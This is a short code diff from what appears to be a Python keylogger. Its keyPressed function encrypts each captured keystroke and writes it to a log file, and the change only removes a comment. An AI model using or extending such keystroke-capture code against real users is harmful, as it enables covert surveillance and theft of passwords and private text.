@@ -42,7 +42,7 @@ def keyPressed(key):
                 else:
                     logKey.write(cipher_suite.encrypt(f'[{key}]'.encode()))
     except Exception as e:
-        print(f"Error logging key: {str(e)}")  # Print any errors encountered during logging
+        print(f"Error logging key: {str(e)}")  
 
     key_count += 1  
 
